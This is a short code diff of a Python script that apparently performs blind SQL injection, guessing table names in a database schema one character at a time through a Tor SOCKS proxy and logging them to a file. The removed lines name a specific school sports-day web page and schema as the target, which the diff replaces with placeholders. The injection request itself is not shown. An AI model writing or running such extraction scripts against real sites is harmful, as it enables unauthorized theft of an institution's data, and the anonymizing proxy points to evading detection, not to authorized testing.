@@ -1,8 +1,8 @@
 import time
 import requests
 
-url = "http://sports.hys.edu.hk/aos/e-sportsday/student/index.php"
-schema = "sch_sportsday_hys_eng"
+url = "--target--"
+schema = "--target--"
 
 #DO NOT CHANGE THIS PART
 prox = {'http': "socks5://127.0.0.1:9050"}
@@ -25,13 +25,15 @@ out = open("tablenamebyschema.txt","a")
 
 tablecount = 74
 tablestart = 21
+
+
 correct = "p"
 
 
 for table in range(tablestart,tablecount):
-    isTableFinished = False
     char = 1
     temp = ""
+    isTableFinished = False
     out.write(str(table)+" ")
     while not isTableFinished:
         for letter in alphabet:
